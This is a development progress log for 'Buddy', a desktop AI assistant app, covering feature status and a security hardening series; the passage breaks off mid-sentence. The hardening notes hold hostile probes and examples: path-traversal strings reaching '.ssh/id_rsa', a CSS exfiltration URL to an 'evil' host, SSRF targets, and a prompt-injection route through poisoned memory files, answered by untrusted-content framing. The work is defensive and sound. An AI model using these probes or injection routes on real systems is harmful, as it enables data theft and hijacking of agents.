# Implementation Progress

Track of implemented features. Updated ONLY when all acceptance criteria pass.

## Phase 0 — Architecture PoC

| FR-ID | Feature | Status | Commit |
|-------|---------|--------|--------|
| FR-CHAT-02 | User input with send | done | 1a13fdd |
| FR-CHAT-01 | Streaming message display | done | eca5ce2 |
| FR-CHAT-03 | Abort generation | done | f858146 |
| FR-CHAT-07 | Auto-scroll with manual override | done | 2c799d8 |

**Phase 0 complete:** YES — all 4 features green (14/14 BDD scenarios, 8 unit tests).

**Native stack validated on macOS (b036774):** worker spawn from the frontend,
real Pi streaming end-to-end (message_update deltas render in the transcript),
and mid-stream abort with partial text kept. Two fixes were needed: spawn config
(NODE_OPTIONS tsx + absolute cwd) and Pi's configureHttpDispatcher() in the
worker (Node >= 26 fetch/undici mismatch left SSE gzip undecompressed → empty
responses). Dev-only diagnostics bridge added in c2442ff (`/__ab_log`,
`/__ab_cmd` via the Vite server).

## Phase 1 — MVP

| FR-ID | Feature | Status | Commit |
|-------|---------|--------|--------|
| FR-BRAIN-01 | AGENTS.md behavioral rules template | done | 2e79ede, 72edf52 |
| FR-BRAIN-02 | SOUL.md character definition | done | 2e79ede, 152ebc4 |
| FR-BRAIN-03 | USER.md placeholder template | done | 2e79ede |
| FR-SETUP-01 | First-run detection → wizard | done | 344a0d7 |
| FR-SETUP-02 | Language selection | done | rework-sprint |
| FR-SETUP-03 | Welcome screen | done | rework-sprint |
| FR-SETUP-04 | Location picker | done | e3ce95e |
| FR-SETUP-05 | Provider authentication (OAuth primary) | done | da071a6 |
| FR-SETUP-06 | Model selection | done | ada10c4 |
| FR-SETUP-07 | Personalization form (name + about) | done | rework-sprint |
| FR-SETUP-08 | Deterministic buddy setup (populate USER.md from form) | done | rework-sprint |
| FR-SETUP-09 | First conversation warm handoff | done | rework-sprint |
| FR-SETUP-10 | Import existing instance | done | 7733b0e |
| FR-PROMPT-01 | System prompt assembly | done | d7a3c12 |
| FR-PROMPT-02 | Session-start enrichment | done | d7a3c12 |
| FR-PERM-01 | Zone 1: buddy home silent allow | done | d3e57f3 |
| FR-PERM-02 | SOUL.md write confirmation (USER.md silent) | done | rework-sprint |
| FR-PERM-03 | Zone 3: outside access prompt | done | d3e57f3 |
| FR-PERM-04 | Hardcoded denylist | done | d3e57f3 |
| FR-PERM-06 | Zone 2: user-designated paths | done | b08a00b |
| FR-PERM-07 | Permission prompt in chat | done | 1031c99 |
| FR-SESSION-01 | Fresh session on every launch | done | rework-sprint |
| FR-SESSION-02 | New session | N/A (every launch is fresh) | |
| FR-SESSION-03 | Session end on app close | done | 842635e, 6d58175 |
| FR-REFLECT-01 | Factual skeleton (crash fallback) | done | 842635e |
| FR-REFLECT-02 | Forked reflect on session end (background child) | done | 6d58175 |
| FR-REFLECT-03 | Checkpoint mid-session reflect (base framework) | done | 6d58175 |
| FR-DEFERRED-01 | Surface deferred on start | done | d7a3c12 |
| FR-INGEST-01 | Drag & drop file ingest | done | 656634b |
| FR-INGEST-02 | Attach button | done | 656634b |
| FR-INGEST-03 | Dropped file implicit permission | done | 656634b |
| FR-INGEST-04 | Supported formats | done | 656634b |
| FR-INGEST-05 | Image attachments (vision) | done | 656634b |
| FR-INGEST-06 | PDF attachments (local text extraction) | done | 03f6b7f |
| FR-SHELL-01 | App header bar with session controls | removed | — |
| FR-SHELL-02 | Explicit end-session button | removed | — |
| FR-SHELL-03 | About / app info (native macOS menu) | done | 48bc7bc |
| FR-GIT-01 | Auto-commit after writes | done | 842635e |
| FR-GIT-02 | Git invisible to user | done | 842635e |
| FR-GIT-03 | Index rebuild on session end | done | 842635e |
| NFR-I18N | Locale module (es + en) | done | rework-sprint |
| NFR-AUTH-ISO | Auth isolation (buddy ≠ Pi CLI) | done | (this commit) |

## Phase 3 — Chat polish (early)

| FR-ID | Feature | Status | Commit |
|-------|---------|--------|--------|
| FR-CHAT-04 | Markdown rendering in assistant messages | done | 19eef12 |
| FR-CHAT-05 | Thinking block display (transient indicator) | done | 5e89120 |
| FR-CHAT-06 | Tool call display (expandable activity block) | done | 5e89120 |
| FR-CHAT-08 | Input textarea resets height after send | done | 491b6e9 |
| FR-SETTINGS-02 | Settings UI (language + read-only config) | done | 6ea7f89 |
| FR-SETTINGS-03 | Cross-provider model switching + inline provider auth | done | cece2f0 |
| FR-SETTINGS-04 | Language switching from settings | done | 6ea7f89 |
| FR-SETTINGS-05 | Settings access from UI (gear icon + menu) | done | 2e051c5 |

**Phase 1 complete:** YES — all Phase 1 FRs implemented and passing (182 unit tests, 104 BDD scenarios).

## Phase 2 — Implemented early

| FR-ID | Feature | Status | Commit |
|-------|---------|--------|--------|
| FR-HEBB-01 | Intercept read tool calls | done | b977e60 |
| FR-HEBB-02 | Frontmatter update | done | b977e60 |
| FR-HEBB-03 | Exclusions | done | b977e60 |
| FR-HEBB-04 | Lazy commit | done | b977e60 |
| FR-REFLECT-03 | Checkpoint mid-session reflect | done | fbee7f9 |
| FR-REFLECT-04 | Log output sanitizer | done | 7c5bd69 |
| FR-DEFERRED-02 | Heartbeat periodic deferred check | done | 7b53829 |
| FR-CONSOL-01 | Usage-based consolidation triggers | done | 7b53829 |
| FR-CONSOL-02 | Cascade ordering | done | 7b53829 |
| FR-CONSOL-03 | Separate maintenance session | done | 7b53829 |
| FR-CONSOL-04 | Lock management | done | 7b53829 |
| FR-CONSOL-05 | Idle-aware scheduling | done | 7b53829 |
| FR-CONSOL-06 | Run journal | done | 7b53829 |
| FR-CONSOL-07 | Consolidation relocate tool for brain file grouping | done | (see E16) |
| FR-COST-02 | Usage panel in Settings | done | (see E15) |
| FR-COST-03 | Budget warning + hard limit | done | (see E15) |

## Post-MVP — Fable review fixes (2026-07-21)

| Finding | Description | Commit |
|---------|-------------|--------|
| A | NFR-SEC-06: block writes to `.pi/settings.json` | b167d04 |
| B | FR-PERM-04: denylist wins over sessionAllowedPaths | b167d04 |
| C | FR-SETUP-05: fix stale auth path in spec | 81a5234 |
| E | AGENTS.md: only SOUL.md needs confirmation | 81a5234 |
| F | Remove redundant afterToolCall Hebbian path | 7987112 |
| G | Wire lifecycle before warm handoff | 7987112 |
| I | Delete dead AppHeader/AboutPanel components | 0c0ce59 |
| J | Remove stray `.ab-app.bak/config.json` | 0c0ce59 |
| K | Move `model-catalog.ts` to `shared/` | 0c0ce59 |
| L | Fix `relPath` prefix match without separator | 0c0ce59 |
| D | Clarify Hebbian is automatic inside app | 0f178ad |

## Phase 2 — Global config + wizard hardening

| FR-ID | Feature | Status | Commit |
|-------|---------|--------|--------|
| FR-PROMPT-03 | Global base prompt (agents-base.md from ~/.buddy/prompts/) | done | 7a4f405 |
| NFR-PORT-05 | Core prompts in ~/.buddy/ (not rootDir) | done | 7a4f405 |
| NFR-CONFIG-04 | Core prompts and docs populated via boot refresh | done | (unify) |
| NFR-MIGRATE-01..05 | *Superseded* — integer schema migrations removed | — | (unify) |
| FR-SETUP-04 | Native directory picker in wizard (Browse button) | done | 72ba219 |
| FR-SETUP-10 | Import auth verification (re-auth if credentials missing) | done | 72ba219 |
| — | Settings re-auth prompt when configured provider lacks auth | done | 72ba219 |

## Sprint: UX + distribution (2026-07-23)

| FR-ID | Feature | Status | Commit |
|-------|---------|--------|--------|
| FR-CHAT-09 | Local file links open via shell.open() | done | a22cbda |
| FR-DEFERRED-03 | OS notifications for due deferred items | done | 2bca847 |
| E12 | Production worker sidecar (bun compile + externalBin) | done | 74e871a |

**Tests at sprint close:** 182 unit + 104 BDD green.

## E13 — Production reflect (2026-07-23)

| Item | Description | Status | Commit |
|------|-------------|--------|--------|
| E13a | Reflect child fork-only context (no system prompt, no skeleton LLM input) | done | 91a689a |
| E13b | Argv dispatch (`--reflect`) + compiled spawn path | done | d945322 |

**Tests at E13 close:** 193 unit + 104 BDD green.

## Production hardening (2026-07-23)

| Fix | Description | Commit |
|-----|-------------|--------|
| Heartbeat rate limit | Guard against runaway timer in Bun binary (5s min gap) | 2b56f20 |
| Fork bomb defense | argv.includes dispatch + BUDDY_REFLECT_CHILD env guard + markPendingInProgress | c548911 |
| Deferred notify guard | Concurrency lock prevents notification plugin flood | f2a5c56 |
| Deferred parser | Tolerate optional HH:MM in entry dates | 2e2ae95 |
| Heartbeat observability | heartbeat_tick JSONL event for debugging | 4b4be94 |
| UI: hide stale indicators | Thinking + tool-activity bubbles hidden after turn ends | ddcb441 |
| Local file links | Migrate FR-CHAT-09 from shell `open()` to opener `openPath()` | b487784 |

## Codebase cleanup (2026-07-23)

| Item | Description | Commit |
|------|-------------|--------|
| Batch 1 | Unify constants, remove dead exports, DEFAULT_LANGUAGE fallback | 728ba82 |
| Batch 2 | Test infra: shared constants, parallel-safe env, reflect-recovery coverage | 29286eb |
| Batch 3 | Prune tool-activity from state, sidecar target script, remove dead reflectInFlight | 10b4fcb |
| getState removal | Remove dead AgentState + getState from entire RPC stack | 8b66be1 |
| Notification content | Show actual reminder text in OS notification + re-show banner mid-session | b487784 |
| ProviderAuthForm | Extract shared OAuth/API key UI from wizard + settings | 7fba097 |

**Tests at cleanup close:** 201 unit + 104 BDD green.

## E14 — Skeleton/pending cleanup (2026-07-24)

| Item | Description | Commit |
|------|-------------|--------|
| E14 | Remove skeleton/pending infrastructure; fork-only reflect with spawn metadata args; drop crash-catchup | b1e755e |

**Tests at E14 close:** 193 unit + 102 BDD green.

**Remaining:** none — skeleton cleanup complete.

## E15 — Cost visibility + budget limits (2026-07-24)

| FR-ID | Feature | Status | Commit |
|-------|---------|--------|--------|
| FR-COST-02 | Usage panel in Settings (session + monthly) | done | a68d228 |
| FR-COST-03 | Budget warning (80%) + hard limit (100%) with OS notifications | done | a68d228 |

**Tests at E15 close:** 268 unit + 136 BDD green.

## Current focus

> **SPRINT: Hardening (v0.1.1) — IN PROGRESS.** Triggered by the external code
> review of 2026-07-26 (Opus 5) and the project response of 2026-07-27.
> **FR-WIKI is deferred until H1–H3 close.**
>
> **H1–H4 plus H4b done.** v0.1.1 (H1+H2) and v0.1.2 (H3) tagged; H4 and H4b
> pending release. **454 unit + 213 BDD green**, typecheck and vite build clean.
> **Review pass complete** (`oauth-service.ts`, `provider-auth.ts`,
> `reflect-child.ts`, wizard). 15 findings classified into three themes, now
> sprints H5–H7; H8 absorbs the rest. H5b (session factory) is **cancelled** —
> replaced by two shared helpers under a reworded NFR-SEC-14.
> **H5–H8 done** (including H6b and H6c). **598 unit + 214 BDD green**,
> typecheck and vite build clean. The hardening series is complete; H6b, H6c,
> H7 and H8 are committed and unreleased. **Next: FR-WIKI.**
>
> **Custom provider withdrawn (2026-07-28).** Found while checking the self-docs
> against reality. See below — the entry point is gone from the wizard and the
> real feature is scoped as FR-PROVIDER-01..03.

### Withdrawn: OpenAI-compatible providers (2026-07-28)

Triggered by a plain question — "I don't see the option to add a custom
endpoint in Settings, I thought it was there." It was not, and the reason it
was not turned out to be the least interesting part.

**The spec and the code said opposite things.** `SPEC.md` stated custom
providers were available "post-setup via Settings → Add provider, not in the
setup wizard". The implementation had it in the wizard and not in Settings —
inverted on both halves. Neither had ever been true: `ADD_PROVIDER_CANDIDATES`
has never contained `custom` since it was introduced in `cece2f0`.

**Neither path worked anyway.** `configureProviderKey` takes a `baseUrl`,
validates it (NFR-SEC-18, written days earlier in H8) and probes
`{baseUrl}/models` with it — then stores only the key. `baseUrl` is not in
`SetupConfig`, not in `.pi/settings.json`, not anywhere the model runtime
reads. A user who configured Ollama got a credential with no address.

**What this says about the test suite is the part worth keeping.** A BDD
scenario covered this and passed. It drove the wizard controller directly, so
it never depended on the option being offered in the UI; and it asserted the
key reached `auth.json`, which it did. Every assertion was true and the feature
did not work, because no assertion named the `baseUrl` — the one value the
feature exists to carry. This is the H4b lesson wearing different clothes:
there, a check was never invoked; here, a value was never followed to the end
of its journey. Both are invisible to a test that only asserts what it already
expects to see.

**I contributed to the problem.** Writing the self-docs the day before, I
described the provider list from the wizard's source and stated users could
point Buddy at Ollama or LM Studio. That was the same error the docs commit was
correcting elsewhere: documenting intent instead of verifying behaviour. The
commit message even claimed H8 "confirmed these still work" — H8 confirmed the
URL validator accepted them, nothing more.

Actions taken: entry point removed from `ProviderStep.svelte`; two BDD
scenarios deleted with the reasoning left in the feature files; `SPEC.md`
corrected in both places; self-docs now list the feature under what Buddy
cannot do; FR-PROVIDER-01..03 written, with `baseUrl` persistence as the first
open question. Backend capability (validation, probe, storage) kept — it is
half of the future feature and is unit-tested.

**Research done 2026-07-28 (Pi source + probing the bundled SDK).** The design
question is answered and written into FR-PROVIDER-01: `baseUrl` goes in a
`models.json`, and `modelsPath` is a first-class `ModelRuntime.create()` option,
so the file lives at `~/.buddy/models.json` and never touches `agentDir`. The
feared conflict with NFR-SEC-19 does not exist.

**The research turned up a live defect instead — since fixed.**
`createBuddyModelRuntime()` omitted `modelsPath`, so the SDK defaulted it to
`~/.pi/agent/models.json` — the Pi CLI's. Probed on this machine: Buddy reported
the user's personal `ollama` and `omlx` providers among its own. A second route
was found while fixing it: `createAgentSession` was called without `agentDir`,
so its `SettingsManager` read the user's `~/.pi/agent/settings.json`. Both
closed; NFR-SEC-19 amended and NFR-SEC-20 written. v0.1.6 shipped with both.

The lesson is in how H6b was scoped. It was framed as "pass Buddy's agentDir to
`createAgentSession`", and it did that correctly. But `getAgentDir()` is the
SDK's default for *several* paths, and `ModelRuntime.create` reaches it by its
own route. The requirement asked which directory we pass; it should have asked
which directories the SDK can still reach on its own. NFR-SEC-19 has been
reworded to the second form. Every SDK entry point with a path defaulting to
`getAgentDir()` now needs auditing, not just the one we knew about.

**Also recorded, latent:** the Settings provider dropdown is derived from the
model list. A provider that is authenticated but contributes no models has no
`<option>`, so nothing is `selected` and the browser shows the first entry —
the control names a provider the user is not using. Unreachable while `custom`
cannot be configured; live again the moment it can. Noted under FR-SETTINGS-03
and FR-PROVIDER-02.

### Sprint: Hardening (v0.1.1) — started 2026-07-27

**Why now:** v0.1.0 "Ana" is publicly released and installed on at least two
machines. The review found one confirmed path traversal, one confirmed XSS, and
an unbounded consolidation retry loop that can drain a real user's budget with no
attacker involved. Feature work pauses until Block A is green.

Sliced into six sprints by unit of change, not by severity. **Every sprint ends
green** — full suite passing and `tsc --noEmit` clean — so any of them is a
shippable stopping point.

**Transversal:** NFR-TEST-01 (adversarial scenario required) is a `done`
criterion for every item below, not a separate work item.

---

#### Sprint H1 — Link containment `[M]` — DONE (2026-07-27)

Goal: the webview can no longer name, read, or launch anything on the filesystem.

| ID | Requirement | Status | Commit |
|----|-------------|--------|--------|
| FR-CHAT-11 | Local links view-only, internal, scoped | done | (this sprint) |
| NFR-SEC-08 | Single path-containment authority | done | (this sprint) |
| NFR-SEC-09 | Frontend holds no filesystem capability | done | (this sprint) |

**Tests at H1 close:** 350 unit + 173 BDD green, typecheck clean (was 313 + 162).

New modules: `shared/viewable-path.ts` (containment authority, browser-safe) ·
`backends/viewable-file.ts` (enforcement + read).
Removed: `resolveLocalPathForOpen`, `LocalLinkAction` type `"open"`,
`FileViewerController.openExternally`, `openPath` from `ChatView`, the
external-open button and its i18n key.
Capabilities dropped: `fs:allow-read-text-file`, `opener:allow-open-path`.
`opener:allow-open-url` narrowed from `http`+`https` to `https` only.

**Design note — where the authority actually lives.** The *rule* is in
`shared/viewable-path.ts` (browser-safe, no `node:path`); the *enforcement* is in
`backends/viewable-file.ts`. The frontend imports the shared rule only to decide
whether to render a link as clickable — presentational, non-authoritative.
Nothing is read until the worker validates again. S1 happened because the rule
was *implemented twice* with different logic; one implementation shared by both
sides is not that pattern.

NFR-SEC-08 was originally worded "one worker-side module … validates every path",
which H1 did not satisfy on any of its three claims: the module is shared rather
than worker-side, the frontend does call it, and containment across the codebase
is still spread over three primitives (`isWithin` in permissions/file-tools/
allowed-paths, `normalizeAbPath` in hebbian, `resolveViewablePath` for links).
Resolved on Jul 27 by rewording NFR-SEC-08 to state the invariant that actually
holds, and splitting the unfinished consolidation into **NFR-SEC-16** (H6) so it
is tracked rather than buried inside an unmet claim.

Verified against the original review probes: `../../secret.md`, `../.ssh/id_rsa`,
`downloads/x.command` and `downloads/Evil.app` all resolve to `null`.

Touches: new worker path-authority module · `shared/api.ts` (+`readViewableFile`) ·
`agent-worker.ts` · `local-path.ts` (drop `resolveLocalPathForOpen`) ·
`local-link-handler.ts` · `file-viewer-controller.ts` · `file-viewer-factory.ts` ·
`FileViewer.svelte` (drop external-open button) · `ChatView.svelte` (drop `openPath`) ·
`capabilities/default.json`

Exit: 173/173 BDD green · typecheck clean · `fs:*` and `opener:allow-open-path`
absent from capabilities · no `openPath` import anywhere in `src/`

**First by necessity, not by priority:** the suite is already red from this work.
Nothing else can ship until it closes.

#### Sprint H2 — Render safety `[S]` — DONE (2026-07-27)

Goal: nothing the LLM or a file can say becomes executable markup.

| ID | Requirement | Status | Commit |
|----|-------------|--------|--------|
| NFR-SEC-10 | Markdown output sanitized before `{@html}` | done | (this sprint) |
| NFR-SEC-11 | CSP defined (`csp: null` prohibited) | done | (this sprint) |

**Tests at H2 close:** 380 unit + 185 BDD green, typecheck and vite build clean.

**No sanitizer dependency.** `marked` routes every raw-HTML construct — block
*and* inline — through the single `html` renderer hook, verified empirically
before implementing. Overriding that hook to escape is complete by construction,
needs no DOM, works in the node test environment, and avoids pulling in
DOMPurify + jsdom. Escaping rather than dropping keeps an injection attempt
visible to the user (aligns with FR-NET-03's "surface the attempt").

**Test method changed mid-sprint.** The first pass asserted on substrings and
produced false failures: `&lt;img onerror="x"&gt;` contains the text `onerror`
while forming no element at all. Substring assertions are the wrong instrument
for a DOM property. `tests/support/rendered-markup.ts` now parses the output
(via `linkedom`, already a dependency) and asserts the real invariant: no
element the author chose, no `on*` attribute, no `javascript:`/`data:`/
`vbscript:` URL.

**CSP shipped:**
`default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';
img-src 'self' data:; font-src 'self'; connect-src 'self' ipc: http://ipc.localhost;
object-src 'none'; base-uri 'self'; frame-src 'none'; frame-ancestors 'none'`

- `connect-src ipc: http://ipc.localhost` is required for Tauri IPC.
- `script-src 'self'` needs no `unsafe-inline`: Tauri injects nonces/hashes for
  bundled assets at compile time, and the built `index.html` has no inline
  script and the bundle no `eval`/`new Function` (both checked).
- `img-src 'self' data:` also blocks CSS-based exfiltration
  (`background: url(https://evil/?leak=…)`) and remote tracking pixels in
  rendered markdown. Side effect: remote images in fetched-and-saved markdown
  will not display. Deliberate.
- `style-src` keeps `'unsafe-inline'`. The app has no inline `style=` attributes
  and no Svelte transitions, so `'self'` would probably work — but Tauri injects
  its own styles, and the residual risk is now small because no
  attacker-controlled markup reaches the DOM at all. Revisit if desired.

> **⚠️ NOT VERIFIED BY TESTS — manual check required before release.** No test in
> this repo loads the app under its CSP. A wrong `connect-src` kills IPC and the
> app is dead on launch; nothing in the suite would catch it. Verify with
> `npm run tauri dev` **and** a production bundle before tagging v0.1.1, and
> watch the webview console for CSP violation reports.

Touches: `markdown.ts` · `tauri.conf.json` · `package.json` (sanitizer dep) ·
new `specs/features/markdown-safety.feature`

Exit: raw HTML neutralized · fence `language` escaped · `data-local-path` still
survives sanitization (FR-CHAT-09/10 must not silently break) · CSP present with
`script-src` free of `unsafe-inline`/`unsafe-eval` · app visually verified in the
real window, not only in tests

#### Sprint H3 — Consolidation cost safety `[M]` — DONE (2026-07-27)

Goal: background maintenance can never drain a user's budget unattended.

| ID | Requirement | Status | Commit |
|----|-------------|--------|--------|
| FR-CONSOL-08 | State persisted per completed depth | done | (this sprint) |
| FR-CONSOL-09 | Failure backoff + retry ceiling | done | (this sprint) |
| FR-COST-05 | Budget gate aborts in-flight cascade | done | (this sprint) |

**Tests at H3 close:** 394 unit + 192 BDD green, typecheck and vite build clean.

**A failure no longer propagates out of the runner.** `runConsolidation` used to
`throw`, which is what skipped `saveConsolidationState` and discarded completed
depths. It now returns `stoppedBy: "failure" | "budget"` and `abandonedDepths`,
so the caller can distinguish outcomes and state is written either way.

**Backoff:** consecutive failures are counted per depth in
`consolidation-state.json`; the next attempt waits `30 min × 2^(n−1)`; at
`CONSOLIDATION_RETRY_CEILING` (3) the depth is abandoned. A success clears the
count, wired into `advanceCounters` so no call site can forget it.

**A blocked depth does not block the others.** `determineTargetDepth` falls
through: a broken weekly consolidation must not stop the daily one from running.
Inside a cascade, a blocked depth is skipped and journalled, not treated as a
failure.

**The pause notice fires from two places, deliberately.** Once at the moment a
depth hits the ceiling, and again on any later tick that finds due work behind an
abandoned depth. Without the second path, a user whose app restarted after the
final failure would never learn maintenance had stopped — and silence is the
exact failure mode this requirement exists to prevent.

**A unit test encoded the bug.** `"does not advance counters when a depth fails"`
asserted that the runner throws *and* that depth 1's advance is discarded. That
was the defect, written down as a requirement. Rewritten as `"keeps a completed
depth when a later depth fails"`. Second time this has happened (H1 had two such
BDD scenarios) — worth watching for in H4–H6.

> **Not verified by tests:** the OS notification itself (`maintenance-notify.ts`)
> follows the existing budget-alert pattern but, like it, is only exercised
> manually. To see it: set `CONSOLIDATION_RETRY_CEILING` to 1 temporarily and
> make a consolidation fail.

Touches: `consolidation-runner.ts` · `heartbeat.ts` · `shared/consolidation-state.ts` ·
`consolidation-scheduler.feature`

Exit: depth-2 failure keeps depth-1's advance · backoff grows across consecutive
failures · ceiling reached → abandoned + user told in plain language · crossing 95%
mid-cascade stops at the next depth boundary with journal status `budget-stopped`

**Fully independent of H1/H2** — if budget drain is observed in the wild, branch
from the last green commit and ship this first.

#### Sprint H4 — Network trust boundary `[M]` — DONE (2026-07-27)

Goal: `fetch_url` cannot reach the local network, and what it returns is data.

| ID | Requirement | Status | Commit |
|----|-------------|--------|--------|
| NFR-SEC-12 | SSRF protection in `fetch_url` | done | (this sprint) |
| FR-NET-03 | Untrusted content framing | done | (this sprint) |

**Tests at H4 close:** 439 unit + 207 BDD green, typecheck and vite build clean.

New module `backends/url-safety.ts`. Three layers, each closing a gap the layer
above cannot see:

1. **Scheme** — only `http`/`https`. `file:`, `data:`, `ftp:` refused outright.
2. **Hostname, before DNS** — `localhost`, `*.local`, `*.internal`,
   `metadata.google.internal` and friends are refused by name. Relying on
   resolution to tell us `localhost` is local would make the rule only as
   trustworthy as the resolver.
3. **Resolved address** — every answer must be public. One private answer is
   enough to refuse, because the client may pick it.

**Redirects are followed manually** (`redirect: "manual"`, max 5 hops), with the
full check re-run on every hop. `redirect: "follow"` validates only the first
URL, which is exactly what redirect-based SSRF relies on.

**The size cap moved into the read loop.** It previously ran after
`await response.arrayBuffer()`, so a server omitting `content-length` could make
the worker buffer without bound before the limit was consulted.

**FR-NET-03** wraps fetched content in `<untrusted-content>` before it enters
context, and `agents-base.md` now states the rule. Mitigation, not a guarantee —
prompt injection is not solvable at the prompt layer, which is why the enforcing
defenses are NFR-SEC-08/10/12. The saved file keeps clean markdown; only the
context copy is wrapped.

**Two test-method corrections during this sprint:**
- The `localhost` case initially passed through to DNS and was allowed, because
  the test resolver answered "public". Real DNS would have blocked it — the test
  was right to fail, and the fix (block by name) is better than what the code
  had.
- An assertion counted bytes produced by the mock rather than bytes consumed by
  the code, so it measured the fixture. Replaced with an endless response body:
  the scenario can only terminate if the read actually stops.

Touches: `fetch-url.ts` · `bundled/prompts/agents-base.md` · `fetch-url.feature`

Exit: loopback, link-local, metadata and private ranges refused after DNS
resolution **and** after each redirect hop · size enforced on accumulated bytes
during streaming · fetched content delimited as untrusted in context

#### Sprint H4b — Maintenance session permissions `[S]` — DONE (2026-07-27)

Unplanned. Found while questioning whether H5b had any real benefit: the answer
was that it fixes something live.

| ID | Requirement | Status | Commit |
|----|-------------|--------|--------|
| FR-CONSOL-10 | Maintenance session enforces the zone model | done | (this sprint) |
| FR-CONSOL-11 | Identity changes by consolidation are surfaced | done | (this sprint) |

**Tests at H4b close:** 454 unit + 213 BDD green, typecheck and vite build clean.

**The finding.** `beforeToolCall` was installed only in `session-boot.ts`. The
consolidation session was created with the full file tool set (`read`, `write`,
`edit`, `grep`, `find`, `ls`) and no hook, so an unattended session had
unrestricted filesystem access — contradicting NFR-SEC-02 ("no file access
bypasses the permission layer") and NFR-SEC-04 ("denylist paths are never
accessible"). Reachable via poisoned brain content: consolidation reads
`agent_brain/`, and brain content predating H4 carries no untrusted-content
framing.

**Policy for an unattended session:** `outside` → deny and record in the daily
log; `identity-write` → allow, because promoting a universal trait into SOUL.md
is what `consolidation.md` instructs. Denylist and `.pi/settings.json` produce
`deny` without asking, so they needed no policy decision at all — the security
hole closed independently of the `ask` question.

**Three test attempts before one worked.** Worth recording, because the first two
looked fine:

1. BDD scenarios driving the gate with the real policy — passed with the bug
   reintroduced. They tested the policy, not the wiring.
2. Unit tests of `installMaintenanceGate` — same. 9 tests, 213 scenarios, all
   green against the bug.
3. A source scan for gate markers — also passed, because `createPermissionGate`
   still appeared in the import line after the call was deleted.

What works: `createMaintenanceSession` takes an injectable `openSession`, so a
test opens a fake session and asserts the hook was attached **to that object**.
Verified by reintroducing the defect: this one fails, the others do not.

**The generalisable lesson:** a missing call cannot be detected by exercising the
function that was never called. Testing the component proves the component
works; only testing the composition proves it was wired. This is the third time
in the sprint that a test described something other than the requirement (H1 and
H3 had tests encoding the bug; here the tests missed it entirely).

#### Review pass — unreviewed files (2026-07-27)

Done before deciding H5's scope, since the H5b question depended on it. Findings
were classified, not fixed inline. `scripts/` was skipped deliberately: dev-only,
outside the app.

| File | Verdict |
|------|---------|
| `oauth-service.ts` | Clean. Event-forwarding wrapper; handles no credentials of its own. |
| `provider-auth.ts` | 6 findings — this is where credentials are actually written. |
| `reflect-child.ts` | 5 findings. Structurally sound; the auth bug of `231ac31` is genuinely fixed and `noTools: "all"` makes the missing gate correct by construction, not by luck. |
| Wizard (`create-buddy.ts`, `location.ts`, `setup-controller.ts`) | 4 findings. |

**Outcome for H5b: cancelled.** The three session call sites are legitimately
different, and what was actually duplicated is two three-line fragments. A shared
`createBuddyModelRuntime()` and `recordSessionUsage()` close the recurrence risk
of `231ac31` without touching the structure of any session. NFR-SEC-14 was
reworded from "a single factory" to shared invariants.

**The findings regrouped by cause, not by file.** Three themes, three sprints —
each ends green and is independently shippable.

#### Sprint H5 — Safe state writing `[S–M]` — DONE (2026-07-27)

Goal: no state file under `~/.buddy/` can be lost or corrupted by a write.

| ID | Requirement | Status | Commit |
|----|-------------|--------|--------|
| NFR-REL-08 | Atomic, non-destructive writes for all `~/.buddy/` state | done | (this sprint) |
| NFR-REL-06 | `usage.json` concurrent-write safety | done | (this sprint) |
| NFR-SEC-14 | Shared session invariants (the two helpers) | done | (this sprint) |

**Tests at H5 close:** 480 unit + 213 BDD green, typecheck and vite build clean.

New module `backends/state-file.ts`: `readStateFile` (absent → undefined,
unreadable → throw), `writeStateFile` (temp + rename, mode at creation) and
`updateStateFile` (read-modify-write under a cross-process lock taken with the
`wx` flag, with staleness breaking).

**A fifth instance found during implementation.** The plan listed four writers;
`boot-refresh.ts` was a fifth and the worst of them. Its `readConfig` returned
`{}` on any read failure and then wrote `{last_app_version}` over the file —
discarding the rootDir pointer, provider, model, language and budget. A
transient `EIO` was enough to send a fully configured user back to the wizard
with nothing to recover. It now leaves an unreadable config untouched.

**The concurrency test spawns real processes.** In-process tests cannot
reproduce the lost update, because the sync fs calls never interleave — the bug
lives between the worker and the reflect child. Verified by reintroducing the
plain read-modify-write: **8 of 32 updates survived**, three writers' work gone.

**Helpers for NFR-SEC-14:** `createBuddyModelRuntime()` and
`recordSessionUsage()`. Verified afterwards that no `ModelRuntime.create` call
remains outside the helper.

**Out of scope, deliberately:** `writeFileSync` calls that write *content* —
daily logs, brain files, downloads — are untouched. NFR-REL-08 covers the JSON
state under `~/.buddy/`. Daily logs arguably deserve atomicity too; not expanded
here to keep the sprint closed.

Covers A1/A2 (`auth.json` silently replaced when unreadable; written in place),
NFR-REL-06 (`usage.json`, three writers across two processes) and W4
(`config.json` written in place). One helper, three call sites.

**Worst case this prevents:** losing every configured provider credential. That
outranks under-counting spend, which is why this goes first.

`usage.json` may need a format change (append-only with aggregation on read) —
that requires reading the existing format too. `auth.json` must keep its shape,
since the Pi SDK reads it natively.

#### Sprint H6 — Reflect reliability `[M]` — DONE (2026-07-27)

Goal: the path that flushes memory at shutdown cannot lose it or leak processes.

| ID | Requirement | Status | Commit |
|----|-------------|--------|--------|
| FR-REFLECT-06 | No git index race between child and worker | done | (this sprint) |
| FR-REFLECT-07 | Reflect child bounded by a timeout | done | (this sprint) |
| NFR-MAINT-02 | Prune `.buddy/reflect-sessions/` | done | (this sprint) |

**Tests at H6 close:** 487 unit + 213 BDD green, typecheck and vite build clean.

`commitAll` now holds an exclusive cross-process lock (the async variant of the
H5 primitive) around the whole stage-and-commit, since staging is global to the
repo. Verified by reintroducing the unlocked version: children die with
`fatal: Unable to create '.git/index.lock': File exists` — which in the reflect
child meant a non-zero exit and the loss of the session summary.

**The first placement of that lock was wrong, and the existing tests caught it.**
Putting it under `.buddy/` inside the repo made correctness depend on `.gitignore`
covering `.buddy/` — which the app cannot guarantee, because FR-SETUP-10 adopts
an existing directory without modifying its content. `git.test.ts` failed with
commits named `update .buddy/.git.lock`: `git add -A` was staging the very lock
that guarded it. The lock now lives in `~/.buddy/locks/`, keyed by a hash of
rootDir, where it cannot be committed by any repo. The concurrency test
deliberately runs without a `.gitignore` to keep that property honest.

**FR-REFLECT-07** is a watchdog in the child's `main()`, `unref`'d so it never
keeps a finished child alive. Five minutes: generous for one LLM call over a
full conversation, and far short of "forever", which is what it replaced.

**NFR-MAINT-02** extends the existing housekeeping pass rather than adding a
second one — `pruneSessionArtifacts` now sweeps both `.buddy/logs/` and
`.buddy/reflect-sessions/`, and both boot and heartbeat call it.

FR-REFLECT-06 is the one that matters: a collision on `.git/index.lock` today
